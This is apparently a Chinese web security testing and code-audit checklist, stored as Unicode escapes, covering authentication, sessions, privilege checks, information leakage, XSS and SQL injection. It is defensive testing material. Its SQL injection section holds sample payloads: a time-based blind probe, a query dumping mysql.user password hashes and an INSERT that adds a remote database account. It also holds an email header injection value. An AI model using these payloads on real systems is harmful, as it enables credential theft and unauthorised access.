\u6211\u4eec\u7528\u7684antisamy\u53ea\u80fd\u8fc7\u6ee4\u57fa\u4e8e\u6807\u7b7e\u7684XSS\u4f2a\u9020\uff0c\u5176\u4ed6\u7684\u65e0\u6cd5\u8fc7\u6ee4\uff0c\u9700\u8981\u505a\u4e8c\u6b21\u8fc7\u6ee4 5\u3001\u903b\u8f91 \u6b64\u5904\u662f\u6307\uff0c\u903b\u8f91\u601d\u8def\u4e0d\u5408\u7406\uff0c\u4e0d\u7b26\u5408\u5b89\u5168\u7684\u4e00\u4e9b\u601d\u60f3\uff0c\u5982\u6743\u9650\u6700\u5c0f\u5316\u7b49\u7b49 6\u3001\u53c2\u6570\u8303\u56f4\u662f\u5426\u9020\u6210dos\u6216\u8005\u5f71\u54cd\u7cfb\u7edf\u6027\u80fd 7\u3001\u6743\u9650\u6821\u9a8c\u3001\u8d8a\u6743 \u200b 1)\u6a2a\u3001\u7eb5\u3001\u591a\u6b65\u9aa4\u5173\u8054\u6027 \u200b 2\uff09 8\u3001session\u4f1a\u8bdd\u7ba1\u7406 \u200b 1\uff09\u5e38\u89c4cookie\u53casession\u5f62\u5f0f \u200b 2\uff09\u628atoken\u4f5c\u4e3asession\u7684\u5f62\u5f0f\uff0c\u7279\u522b\u6ce8\u5165\u767b\u5f55\u7528\u6237\u548ctoken\u7684\u7ed1\u5b9a\u5173\u7cfb 9\u3001\u53c2\u6570\u662f\u5426\u662f\u7b80\u5355\u5f62\u5f0f\uff0c\u662f\u5426\u53ef\u4ee5\u9020\u6210\u904d\u5386 10\u3001\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u7b2c\u4e09\u65b9\u63d2\u4ef6\u3001\u5f00\u6e90\u8f6f\u4ef6\u662f\u5426\u662f\u6700\u65b0\u3001\u662f\u5426\u6709\u5b89\u5168\u6f0f\u6d1e 11\u3001\u4ee3\u7801\u4e2d\u6240\u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u662f\u5426\u662f\u5b89\u5168\u7684 12\u3001\u8df3\u8f6c\u4e2d\u7684redirect\u5f62\u5f0f\u4e2d\u4e0d\u8981\u5e26\u654f\u611f\u4fe1\u606f\uff0c\u4f1a\u88ab\u53d1\u56de\u5ba2\u6237\u7aef\u91cd\u65b0\u8bf7\u6c42\u7684\uff0c\u76f8\u5f53\u4e8e\u628a\u8fd9\u4e9b\u53c2\u6570\u653e\u5728\u4e86get\u8bf7\u6c42\u4e2d 13\u3001SSRF\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u6ce8\u610furl\u4e2d\u542b\u6709\u53e6\u5916\u4e00\u4e2aurl\u7684\u8bf7\u6c42 \u200b 1\uff09\u6e90\u7801\u4e2d\u4f7f\u7528urlconnection \u652f\u6301\u7684\u534f\u8bae\u9664\u4e86http\u548chttps\u4ee5\u5916\uff0c\u8fd8\u6709file\u3001ftp\u3001jar\u3001mailto\u7b49 \u200b request\u3001httpurlconnecttion\u3001httpClient\u3001URL\u7b49\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42 14\u3001\u52a0\u5bc6\u7b97\u6cd5\u7684\u4f7f\u7528\uff0c\u662f\u5426\u4f7f\u7528\u7684\u662f\u4e0d\u5408\u573a\u666f\u7684\u5f31\u7b97\u6cd5 15\u3001\u6570\u636e\u63d2\u5165\u81ea\u589eId\u653b\u51fb \u200b \u6570\u636e\u4f20\u5165\u8fc7\u6765\u505a\u63d2\u5165\u52a8\u4f5c\uff0c\u5e76\u4e14\u4f7f\u7528spring\u81ea\u52a8\u7ed1\u5b9a\u5bf9\u8c61\u65b9\u6cd5\u83b7\u53d6\u6570\u636e\uff0c\u4e4b\u540e\u4f7f\u7528\u751f\u6210\u7684\u63d2\u5165sql \u6b64\u65f6\u81ea\u52a8\u589e\u957fid\u4e0d\u8981\u5199\u5230\u66f4\u65b0\u8bed\u53e5\u4e2d\uff0c\u5982\u679c\u5199\u5165\u53ef\u80fd\u9020\u6210\u6076\u610f\u6ce8\u5165integer\u8303\u56f4\u6700\u5927\u503c2147483647\uff0c\u4f7f\u529f\u80fd\u4e0d\u53ef\u7528dos 16\u3001Spring\u81ea\u52a8\u7ed1\u5b9a\u53c2\u6570\uff0c\u53c2\u6570\u6269\u5c55\u653b\u51fb \u540e\u53f0\u4f7f\u7528\u7684\u5bf9\u8c61\u53c2\u6570\u81ea\u52a8\u7ed1\u5b9a\u83b7\u53d6\uff0c\u76f8\u5e94\u7684sql\u4f7f\u7528\u4e86\u81ea\u52a8\u7684if\u662f\u5426\u4e3anull\u548c\u4e3a\u7a7a\u7684\u5224\u65ad\u6761\u4ef6\uff0c\u524d\u53f0\u53ef\u4ee5\u6839\u636e\u731c\u6d4b \u200b \u6ce8\u5165\u961f\u5f62\u7684\u76f8\u5e94\u7684\u5c5e\u6027\u5b9e\u73b0\u975e\u9884\u6599\u7ed3\u679c 5.2. *WEB\u5b89\u5168\u6d4b\u8bd5* \u00b6 5.2.1. *\u8eab\u4efd\u9a8c\u8bc1* \u00b6 \u4e3a\u9632\u6b62\u5bc6\u7801\u7834\u89e3\u548c\u731c\u6d4b\uff1a \u590d\u6742\u5ea6\u8981\u6c42\uff0c\u5fc5\u987b\u7531\u5927\u5199\u3001\u5c0f\u5199\u3001\u6570\u5b57\u7b49\u7ec4\u6210\uff1b \u65f6\u6548\u6027\u8981\u6c42\uff0c\u5efa\u8bae\u7528\u62373\u4e2a\u6708\u66f4\u6539\u4e00\u6b21\u53e3\u4ee4\uff1b \u5bc6\u7801\u957f\u5ea6\u8981\u6c42\uff0c\u6700\u5c0f8\u4f4d\uff0c\u6700\u5927\uff1f\u4f4d\uff1b \u7ba1\u7406\u5458\u91cd\u7f6e\u5bc6\u7801\u540e\u5bc6\u7801\u5fc5\u987b\u5728\u4e0b\u6b21\u767b\u5f55\u66f4\u6539\uff1b \u5f3a\u5ea6\u8981\u6c42\uff0c\u4e0d\u80fd\u8ddf\u539f\u5bc6\u7801\u4e00\u81f4\uff0c\u4e0d\u80fd\u4e0e\u7528\u6237\u540d\u76f8\u4f3c\uff08\u5982\uff0c\u4e0d\u80fd\u5305\u542b\u7528\u6237\u540d\u6b63\u5199\u53cd\u5199\u5927\u5c0f\u5199\u7b49\uff09\uff0c \uff08\u6700\u65b0\u4e5f\u6709\u8bf4\u6cd5\u4e0d\u5efa\u8bae\u9891\u7e41\u4fee\u6539http:// www.secdoctor.cn/html/sec/35995.html \uff09 \u53e3\u4ee4\u8ba4\u8bc1\u5fc5\u987b\u5728\u670d\u52a1\u7aef\u8fdb\u884c\u3002 \u5fc5\u987b\u8981\u6709\u9a8c\u8bc1\u7801\u673a\u5236\u3002 \u767b\u5f55\u9501\u5b9a\uff0c\u767b\u5f55\u9700\u8981\u6709\u9501\u5b9a\u673a\u5236\u5373\u5c31\u662f\u591a\u6b21\u767b\u5f55\u5931\u8d25\u540e\u9501\u5b9a\u8d26\u53f7\u6216\u8005ip\uff0c\u5728\u4e00\u6bb5\u65f6\u95f4\u540e\u81ea\u52a8\u89e3\u9501\u3002 \u624b\u673a\u9a8c\u8bc1\u7801\u8f70\u70b8 \u624b\u673a\u9a8c\u8bc1\u7801\u8d85\u65f6\u673a\u5236 \u8d26\u6237\u679a\u4e3e\u6d4b\u8bd5 \u5f31\u5bc6\u7801\u6982\u5ff5\uff1a https://help.aliyun.com/knowledge_detail/37509.html?spm=5176.7837442.2.5.ZotsLv 5.2.2. *\u9a8c\u8bc1\u7801* *\uff08\u666e\u901a\u9a8c\u8bc1\u7801\u3001\u77e5\u8bc6\u9a8c\u8bc1\u7801\u3001\u65e0\u9700\u601d\u8003\u7684\u6ed1\u52a8\u9a8c\u8bc1\u7801\uff09* \u00b6 \u9a8c\u8bc1\u7801\u5b57\u7b26\u751f\u6210\u7b97\u6cd5\u7684\u5b89\u5168\u968f\u673a\u6570 \u9a8c\u8bc1\u7801\u5b57\u7b26\u4e0d\u80fd\u88ab\u9a8c\u8bc1\u7801\u8bc6\u522b\u5de5\u5177\u8bc6\u522b \u9a8c\u8bc1\u7801\u5fc5\u987b\u662f\u4e00\u6b21\u6027\u7684 \u9a8c\u8bc1\u7801\u8d85\u65f6\uff08\u9a8c\u8bc1\u7801\u6709\u6548\u671f\u7684\u610f\u4e49\uff1a1\u3001\u589e\u52a0\u56fe\u7247\u5904\u7406\u8bc6\u522b\u7684\u96be\u5ea6\uff1b2\u3001\u9a8c\u8bc1\u7801\u6ca1\u6709\u6709\u6548\u671f\u7684\u8bdd\u5bfc\u81f4\u670d\u52a1\u5668\u9a8c\u8bc1\u7801\u5806\u79ef\uff09 \u5728\u5fd8\u8bb0\u5bc6\u7801\u5904\u505a\u5b89\u5168\u95ee\u7b54\u6d4b\u8bd5 \u5efa\u8bae\u7684\u9a8c\u8bc1\u7801\u5f62\u5f0f\uff1a \u5f53\u524d\u7684\u6700\u6d41\u884c\u7684\u6ed1\u52a8\u5757\u9a8c\u8bc1\u7801\uff0c\u6709\u70b9\u7528\u6237\u65e0\u9700\u52a8\u8111\uff0c\u4e0d\u4f1a\u6253\u65ad\u7528\u6237\u7684\u601d\u8003\u3002 \uff08\u9a8c\u8bc1\u7801\u7684\u524d\u4e16\u4eca\u751f\uff1a http://www.freebuf.com/articles/web/102276.html \uff09 5.2.3. *\u4f1a\u8bdd\u7ba1\u7406* \u00b6 \u767b\u5f55\u524d\u540e\u4f1a\u8bdd\u6807\u793a\u8981\u6709\u53d8\u5316 \u5b89\u5168\u9000\u51fa\u4f1a\u8bdd\u6807\u793a\u6ce8\u9500 \u4f1a\u8bdd\u6807\u793a\u5b89\u5168\u968f\u673a \u4f1a\u8bdd\u6807\u793a\u7684\u957f\u5ea6\u9002\u5ea6 \u4f1a\u8bdd\u8d85\u65f6\u673a\u5236 \u4f1a\u8bdd\u6807\u8bc6\u7684\u4f20\u8f93\u548c\u5b58\u50a8 \u4f1a\u8bdd\u6807\u8bc6\u5938PC\u8bbf\u95ee 5.2.4. *\u6743\u9650\u7ba1\u7406* \u00b6 \u901a\u8fc7\u7070\u5316\uff08\u9690\u85cf\uff09\u4f7f\u529f\u80fd\u5931\u6548 \u7eb5\u5411\u8d8a\u6743 \u6a2a\u5411\u8d8a\u6743 \u6743\u9650\u5206\u79bb \uff08\u7cfb\u7edf\u7ba1\u7406\u3001\u5b89\u5168\u7ba1\u7406\u3001\u5ba1\u8ba1\u7ba1\u7406 \u7cfb\u7edf\u7ba1\u7406\u5458\u4e3b\u8981\u8d1f\u8d23\u7528\u6237\u7ba1\u7406\u548c\u7cfb\u7edf\u65e5\u5e38\u8fd0\u4f5c\u76f8\u5173\u7684\u7ef4\u62a4\u5de5\u4f5c\uff1b \u5b89\u5168\u7ba1\u7406\u5458\u8d1f\u8d23\u5b89\u5168\u7b56\u7565\u7684\u914d\u7f6e\u548c\u7cfb\u7edf\u8d44\u6e90\u5b89\u5168\u5c5e\u6027\u7684\u8bbe\u5b9a\uff1b \u5ba1\u8ba1\u7ba1\u7406\u5458\u5219\u5bf9\u7cfb\u7edf\u5ba1\u8ba1\u4fe1\u606f\u8fdb\u884c\u7ba1\u7406\uff09 \u53c2\u770b\u300a\u5173\u4e8e\u8d8a\u6743\u300b 5.2.5. *\u654f\u611f\u4fe1\u606f\u4f20\u8f93\u53ca\u5b58\u50a8* \u00b6 \u654f\u611f\u4fe1\u606f\u4e0d\u80fd\u4ee5get\u65b9\u5f0f\u63d0\u4ea4 \u4f20\u8f93\u901a\u9053\u4f7f\u7528https\uff08\u5173\u952e\u6570\u636e\u63d0\u4ea4\u670d\u52a1\u7aef\u4e0d\u63a5\u6536http\u660e\u6587\u6570\u636e\uff09 \u4e25\u683c\u5b89\u5168\u4f20\u8f93HSTS\uff08\u786e\u4fdd\u4ece\u6d4f\u89c8\u5668\u53d1\u51fa\u7684\u8bf7\u6c42\u5c31\u662fhttps\u7684\uff09 \u5728url\u4e2d\u6709session \u5bf9\u7528\u6237\u4fdd\u5bc6\u7684\u4fe1\u606f\u4e0d\u80fd\u4f20\u8f93\u5230\u5ba2\u6237\u7aef \u542b\u6709\u654f\u611f\u4fe1\u606f\u7684\u9875\u9762\u9700\u8981\u8bbe\u7f6e\u4e0d\u7f13\u5b58 5.2.6. *\u5b89\u5168\u5ba1\u8ba1* \u00b6 \u767b\u5f55\u3001\u9000\u51fa\u3001\u64cd\u4f5c\u7b49\u90fd\u8981\u6709\u65e5\u5fd7 \u65e5\u5fd7\u683c\u5f0f\u6807\u51c6\uff08\u65f6\u95f4\u3001\u8c01\u3001\u505a\u4e86\u4ec0\u4e48\u64cd\u4f5c\u3001\u7ed3\u679c\u600e\u6837\uff09 \u65e5\u5fd7\u8bbf\u95ee\u7684\u9650\u5236 \u65e5\u5fd7\u4e2d\u7684\u654f\u611f\u4fe1\u606f \u4ed6\u4eec\u662f\u5982\u4f55\u8fed\u4ee3\u7684\uff1f\u65e5\u5fd7\u662f\u5426\u4fdd\u5b58\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff1f \u65e5\u5fd7\u662f\u5982\u4f55\u88ab\u5ba1\u67e5\u7684\uff1f\u7ba1\u7406\u5458\u80fd\u5426\u901a\u8fc7\u5ba1\u67e5\u51fa\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff1f \u65e5\u5fd7\u5907\u4efd\u5982\u4f55\u4fdd\u5b58\uff1f \u65e5\u5fd7\u8bb0\u5f55\u6570\u636e\u524d\u662f\u5426\u8fdb\u884c\u9a8c\u8bc1\uff08\u6700\u5c0f\u6700\u5927\u957f\u5ea6\uff0c\u5b57\u7b26\u7b49\uff09\uff1f 5.2.7. *\u4fe1\u606f\u6cc4\u9732* \u00b6 \u6570\u636e\u5e93\u7248\u672c\u6cc4\u9732 \u5bb9\u5668\u7248\u672c\u6cc4\u9732 \u7edd\u5bf9\u8def\u5f84\u6cc4\u9732 \u5f02\u5e38\u4fe1\u606f\u6cc4\u9732 \u6cc4\u9732\u670d\u52a1\u5668\u8def\u5f84 \u6cc4\u9732\u5bb9\u5668\u7248\u672c \u6cc4\u9732\u7a0b\u5e8f\u8be6\u7ec6\u5806\u6808\u4fe1\u606f \u6e90\u4ee3\u7801\u6cc4\u9732 \u68c0\u6d4bWeb\u7f51\u7edc\u662f\u5426\u5b58\u5728\u6e90\u4ee3\u7801\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5982\u679c\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u4e0b\u8f7d\u7f51\u7ad9\u7684\u6e90\u4ee3\u7801\u3002 \u7ba1\u7406\u5730\u5740\u6cc4\u9732 \u7f51\u7ad9\u7ba1\u7406\u5730\u5740\u5c5e\u4e8e\u5185\u90e8\u4f7f\u7528\u7684\u4fe1\u606f\uff0c\u516c\u5f00\u589e\u52a0\u4e86\u5b89\u5168\u98ce\u9669\u3002 Bak\u4fe1\u606f\u6cc4\u9732 \u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u548c\u4fa6\u5bdf\u4fe1\u606f\u6cc4\u9732\uff08\u6682\u65f6\u4e0d\u6d89\u53ca\uff09 \u670d\u52a1\u5668\u6307\u7eb9\u63a2\u6d4b\uff08\u4f7f\u7528\u6307\u7eb9\u63a2\u6d4b\u5de5\u5177whatweb\u9700\u8981\u5728linux\u4e0a\u7f16\u8bd1\u8fd0\u884c\uff0chttprint--\u6700\u65b0\u7684signatures.txt\u4e0d\u7136\u8bc6\u522b\u5230\u4e0d\u51c6\u786e\uff09 \u3010\u5176\u4ed6\u5173\u6ce8\u9879\uff1a\u3011 \u679a\u4e3eweb\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u7684\u5e94\u7528\u7a0b\u5e8f Whois\u4fe1\u606f\u6536\u96c6 \u8bc6\u522bWeb\u5e94\u7528\u6846\u67b6 Owasp\u6d4b\u8bd5\u6307\u53574\u4e2d\u6587\uff1a https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/web_application_security_testing/review_webserver_metafiles_for_information_leakage_otg-info-003.html \u62d6\u5e93\u649e\u5e93http://blog.nsfocus.net/information-leakage-thinking-library-collision/ 5.2.8. *\u8f93\u5165\u6821\u9a8c* \u00b6 \u524d\u53f0\u540e\u53f0\u90fd\u5fc5\u987b\u6821\u9a8c\uff08\u201c\u79fb\u9664\u5df2\u77e5\u7684\u6076\u610f\u6570\u636e\u201d\u4e0d\u5982\u79fb\u9664\u201c\u826f\u597d\u6570\u636e\u4e4b\u5916\u7684\u6240\u6709\u6570\u636e\u201d\uff09 5.2.8.1. *XSS\uff08\u8de8\u7ad9\u70b9\u811a\u672c\u653b\u51fb\uff09* \u00b6 XSS-1\u53cd\u5c04\u578b\u8de8\u7ad9\u70b9\u811a\u672c\u7f16\u5236 XSS-2\u5b58\u50a8\u578b\u8de8\u7ad9\u70b9\u811a\u672c\u7f16\u5236\uff08 http://xxxxx0000sssss.lofter.com/post/14b1dc_50023e \uff09 XSS-3 DOM\u578b\u8de8\u7ad9\u70b9\u811a\u672c\u7f16\u5236 dom xss\u5e76\u4e0d\u590d\u6742\uff0c\u4ed6\u4e5f\u5c5e\u4e8e\u53cd\u5c04\u578bxss\u7684\u4e00\u79cd\uff0cdomxss\u53d6\u51b3\u4e8e\u8f93\u51fa\u4f4d\u7f6e\uff0c\u5e76\u4e0d\u53d6\u51b3\u4e8e\u8f93\u51fa\u73af\u5883\uff0c\u56e0\u6b64domxss\u65e2\u6709\u53ef\u80fd\u662f\u53cd\u5c04\u578b\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5b58\u50a8\u578b\u7684)\uff0c\u7b80\u5355\u53bb\u7406\u89e3\u5c31\u662f\u56e0\u4e3a\u4ed6\u8f93\u51fa\u70b9\u5728DOM\uff0c\u6240\u4ee5\u5728\u9053\u54e5\u7684\u300a\u767d\u5e3d\u5b50\u8bb2Web\u5b89\u5168\u91cc\u300b\u4e5f\u6709\u8be6\u7ec6\u4ecb\u7ecd\u3002dom - xss\u662f\u901a\u8fc7url\u4f20\u5165\u53c2\u6570\u53bb\u63a7\u5236\u89e6\u53d1\u7684\u3002 HPP\uff08HTTP\u53c2\u6570\u6c61\u67d3[\u540c\u540d\u53c2\u6570] http://blog.csdn.net/eatmilkboy/article/details/6761407 \uff09 \u6f0f\u6d1e\u5371\u5bb3\uff1a 1\u3001\u9493\u9c7c\u6b3a\u9a97\uff1a\u6700\u5178\u578b\u7684\u5c31\u662f\u5229\u7528\u76ee\u6807\u7f51\u7ad9\u7684\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u5c06\u76ee\u6807\u7f51\u7ad9\u91cd\u5b9a\u5411\u5230\u9493\u9c7c\u7f51\u7ad9\uff0c\u6216\u8005\u6ce8\u5165\u9493\u9c7cJavaScript\u4ee5\u76d1\u63a7\u76ee\u6807\u7f51\u7ad9\u7684\u8868\u5355\u8f93\u5165\uff0c\u751a\u81f3\u53d1\u8d77\u57fa\u4e8eDHTML\u66f4\u9ad8\u7ea7\u7684\u9493\u9c7c\u653b\u51fb\u65b9\u5f0f\u3002 2\u3001\u7f51\u7ad9\u6302\u9a6c\uff1a\u8de8\u7ad9\u65f6\u5229\u7528IFrame\u5d4c\u5165\u9690\u85cf\u7684\u6076\u610f\u7f51\u7ad9\u6216\u8005\u5c06\u88ab\u653b\u51fb\u8005\u5b9a\u5411\u5230\u6076\u610f\u7f51\u7ad9\u4e0a\uff0c\u6216\u8005\u5f39\u51fa\u6076\u610f\u7f51\u7ad9\u7a97\u53e3\u7b49\u65b9\u5f0f\u90fd\u53ef\u4ee5\u8fdb\u884c\u6302\u9a6c\u653b\u51fb\u3002 3\u3001\u8eab\u4efd\u76d7\u7528\uff1aCookie\u662f\u7528\u6237\u5bf9\u4e8e\u7279\u5b9a\u7f51\u7ad9\u7684\u8eab\u4efd\u9a8c\u8bc1\u6807\u5fd7\uff0cXSS\u53ef\u4ee5\u76d7\u53d6\u5230\u7528\u6237\u7684Cookie\uff0c\u4ece\u800c\u5229\u7528\u8be5Cookie\u76d7\u53d6\u7528\u6237\u5bf9\u8be5\u7f51\u7ad9\u7684\u64cd\u4f5c\u6743\u9650\u3002\u5982\u679c\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\u7528\u6237Cookie\u88ab\u7a83\u53d6\uff0c\u5c06\u4f1a\u5bf9\u7f51\u7ad9\u5f15\u53d1\u5de8\u5927\u7684\u5371\u5bb3\u3002 4\u3001\u76d7\u53d6\u7f51\u7ad9\u7528\u6237\u4fe1\u606f\uff1a\u5f53\u80fd\u591f\u7a83\u53d6\u5230\u7528\u6237Cookie\u4ece\u800c\u83b7\u53d6\u5230\u7528\u6237\u8eab\u4efd\u4f7f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u53d6\u5230\u7528\u6237\u5bf9\u7f51\u7ad9\u7684\u64cd\u4f5c\u6743\u9650\uff0c\u4ece\u800c\u67e5\u770b\u7528\u6237\u9690\u79c1\u4fe1\u606f\u3002 5\u3001\u5783\u573e\u4fe1\u606f\u53d1\u9001\uff1a\u6bd4\u5982\u5728SNS\u793e\u533a\u4e2d\uff0c\u5229\u7528XSS\u6f0f\u6d1e\u501f\u7528\u88ab\u653b\u51fb\u8005\u7684\u8eab\u4efd\u53d1\u9001\u5927\u91cf\u7684\u5783\u573e\u4fe1\u606f\u7ed9\u7279\u5b9a\u7684\u76ee\u6807\u7fa4\u3002 6\u3001\u52ab\u6301\u7528\u6237Web\u884c\u4e3a\uff1a\u4e00\u4e9b\u9ad8\u7ea7\u7684XSS\u653b\u51fb\u751a\u81f3\u53ef\u4ee5\u52ab\u6301\u7528\u6237\u7684Web\u884c\u4e3a\uff0c\u76d1\u89c6\u7528\u6237\u7684\u6d4f\u89c8\u5386\u53f2\uff0c\u53d1\u9001\u4e0e\u63a5\u6536\u7684\u6570\u636e\u7b49\u7b49\u3002 7\u3001XSS\u8815\u866b\uff1aXSS \u8815\u866b\u53ef\u4ee5\u7528\u6765\u6253\u5e7f\u544a\u3001\u5237\u6d41\u91cf\u3001\u6302\u9a6c\u3001\u6076\u4f5c\u5267\u3001\u7834\u574f\u7f51\u4e0a\u6570\u636e\u3001\u5b9e\u65bdDDoS\u653b\u51fb\u7b49\u3002 \u53c2\u8003\uff1a https://help.aliyun.com/knowledge_detail/37444.html?spm=5176.7837442.2.11.F8ceHg http://blog.csdn.net/change518/article/details/51024706 \u9690\u85cf\u57dfXSS\uff08\u501f\u52a9accesskey\u5c5e\u6027\uff09 5.2.8.2. *SQL\u6ce8\u5165* \u00b6 (1\u3001java\u9884\u5904\u7406preparestatement\uff1b2\u3001\u6b63\u5219\u8868\u8fbe\u5f0f\u8fc7\u6ee4\u53c2\u6570\uff1b3\u3001\u4e25\u683c\u5b57\u7b26\u4e32\u8fc7\u6ee4\uff1b4\u3001\u53c2\u6570\u5316\u7684sql) \u4f8b\u5b50\uff1a\u53c2\u6570date=if(now()=sysdate(),sleep(0),0)/ 'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\" / Sql\u8bed\u53e5\u4e2d\u7684/\u659c\u6760\uff1a\u8868\u793a\u6267\u884c\uff0c\u628a\u4e4b\u524d\u65f6\u95f4\u5185\u7684\u7f13\u5b58\u4e2d\u7684\u8bed\u53e5\u518d\u6267\u884c\u4e00\u904d \u200b \\\u659c\u6760\uff1a\u8868\u793a\u8bed\u53e5\u672a\u5b8c\u6362\u884c \u5355\u884c\u6ce8\u91ca\uff1a-- \u591a\u884c\u6ce8\u91ca\uff1a/* */ If(now()=sysdate(),sleep(2),0)\u8868\u793a\u5982\u679cnow()=sysdate(),\u4e3a\u771f\u6267\u884csleep(2),\u5426\u5219\u6267\u884c0 \u5f53\u524d\u5f62\u52bf\u4e0b\uff0c\u65b0\u5f00\u53d1\u7684\u7f51\u7ad9\uff0c\u5927\u90e8\u5206\u91c7\u7528\u65b0\u6846\u67b6\u90fd\u5df2\u7ecf\u53ef\u4ee5\u9884\u9632sql\u6ce8\u5165\u4e86\uff0c\u53ea\u6709\u624b\u52a8\u62fc\u63a5\u7684sql\u8bed\u53e5\u6613\u88absql\u6ce8\u5165\u3002 \u751f\u6210\u6ce8\u5165\u7528\u4f8b\u65f6\u6ce8\u610f\uff1a 1\uff09\u2019 \u5355\u5f15\u53f7\u95ed\u5408 2\uff09\u2018OR \u5355\u5f15\u53f7\u4e5f\u53ef\u4ee5\u6709\u7ed3\u675f\u5f00\u59cb\u4e0b\u4e00\u5143\u7d20\u7684\u6548\u679c 3\uff09-- - \u6ce8\u91ca\u540e\u9762\u8ddf\u7a7a\u683c\u5b9e\u73b0\u6ce8\u91ca\u4e0d\u8ddf\u540e\u9762\u8bed\u53e5\u8fde\u63a5\uff0c\u540e\u9762\u5b9e\u9645\u88ab\u6ce8\u91ca\u6389\u6548\u679c 4\uff09Select CONCAT_WS(0x3A, USER, PASSWORD) FROM mysql.user \u83b7\u53d6\u6570\u636e\u5e93\u7528\u6237 5\uff09union all \u8fde\u63a5\u4e24\u4e2aselect\u67e5\u8be2\u7ed3\u679c\uff0c\u5408union\u7684\u533a\u522b\u4e0d\u53bb\u91cd\u590d\uff1b\u4e24\u4e2aselect\u67e5\u8be2\u7684\u5b57\u6bb5\u4e00\u6837 6\uff09insert into mysql.user(Host,User,Password) values(\"%\",\"Sectest\",password(\"111111\")) \u7ed9\u6570\u636e\u5e93\u6dfb\u52a0\u7528\u6237 %\uff1a\u8fdc\u7a0b\u7528\u6237\uff0clocalhost\uff1a\u672c\u5730\u7528\u6237 \u7cfb\u7edf\u4f7f\u7528\u4e86MyBatis\u52a8\u6001SQL\u6846\u67b6\u7ec4\u88c5sql\uff0c\u6ce8\u610f\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 \u548c#\u7684\u4f7f\u7528\uff0c\u4f7f\u7528 \u548c#\u7684\u4f7f\u7528\uff0c\u4f7f\u7528 \u53ef\u80fd\u5bfc\u81f4sql\u6ce8\u5165 \u62fc\u63a5\u540e\u7684\u8bed\u53e5\u518d\u653e\u5165\u9884\u7f16\u8bd1\u5bf9\u8c61\u662f\u5f92\u52b3\u7684\uff0c\u56e0\u4e3a\u5728\u9884\u7f16\u8bd1\u4e4b\u524d\u62fc\u63a5\u7684SQL\u8bed\u53e5\u6267\u884c\u903b\u8f91\u5df2\u7ecf\u88ab\u7834\u574f\uff0c\u539f SQL\u8bed\u53e5\u7684\u672c\u610f\u5df2\u7ecf\u88ab\u6539\u53d8\u4e86\u3002 \u6982\u5ff5\uff1a https://help.aliyun.com/knowledge_detail/37450.html?spm=5176.7837442.2.10.ZotsLv Sql\u6ce8\u5165\u5e38\u7528\u8bed\u53e5\uff1a http://www.111cn.net/database/mysql/58518.htm http://wenku.baidu.com/link?url=sK_daSqJFJt3KsCuYQOjCkuGldDJSJQbATiRX42UEocanxFejYSjVESnyHPhvDP___hGAbKSLMhh4020TOP9wItRr1YWiq8OQ1HzYItXc6q 5.2.8.3. *XML\u6ce8\u5165\u6d4b\u8bd5* \u00b6 \uff08\u501f\u52a9XXE,\u653b\u51fb\u8005\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6,DOS\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u4ee5\u53ca\u4ee3\u7406\u626b\u63cf\u5185\u7f51\u7b49\uff09 \u65e5\u5fd7\u6ce8\u5165\uff08\\r,\\n\u6362\u884c\uff0c\u4f2a\u9020\u65e5\u5fd7\uff09 \u547d\u4ee4\u6ce8\u5165\uff08\u64cd\u7eb5\u7cfb\u7edf\u547d\u4ee4\uff09 Email Header Injection(\u90ae\u4ef6\u6807\u5934\u6ce8\u5165) /*\uff08\u6211\u4eec\u5728\u6682\u65f6\u4e0d\u6d89\u53ca\uff09 Email Header Injection\uff1a\u5982\u679c\u8868\u5355\u7528\u4e8e\u53d1\u9001email,\u8868\u5355\u4e2d\u53ef\u80fd\u5305\u62ec\u201csubject\u201d\u8f93\u5165\u9879\uff08\u90ae\u4ef6\u6807\u9898\uff09\uff0c\u6211\u4eec\u8981\u9a8c\u8bc1subject\u4e2d\u5e94\u80fdescape\u6389\u201c\\n\u201d\u6807\u8bc6\u3002 \u56e0\u4e3a\u201c\\n\u201d\u662f\u65b0\u884c\uff0c\u5982\u679c\u5728subject\u4e2d\u8f93\u5165\u201chello\\ncc: spamvictim@example.com \u201d\uff0c\u53ef\u80fd\u4f1a\u5f62\u6210\u4ee5\u4e0b Subject: hello cc: spamvictim@example.com \u5982\u679c\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u8fd9\u6837\u7684subject\uff0c\u90a3\u4ed6\u53ef\u80fd\u4f1a\u7ed9\u5229\u7528\u8fd9\u4e2a\u7f3a\u9677\u901a\u8fc7\u6211\u4eec\u7684\u5e73\u53f0\u7ed9\u5176\u5b83\u7528\u6237\u53d1\u9001\u5783\u573e\u90ae\u4ef6\u3002 */ 5.2.8.4. *\u4ee3\u7801\u6267\u884c* \u00b6 \u4ee3\u7801\u6267\u884c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u5bf9\u4f20\u5165\u547d\u4ee4\u7684\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u5bfc\u81f4\u6076\u610f\u7528\u6237\u80fd\u63a7\u5236\u6700\u7ec8\u6267\u884c\u7684\u547d\u4ee4\uff0c\u8fdb\u800c\u5165\u4fb5\u7cfb\u7edf\uff0c\u5bfc\u81f4\u4e25\u91cd\u7834\u574f\u7684\u9ad8\u5371\u6f0f\u6d1e\u3002 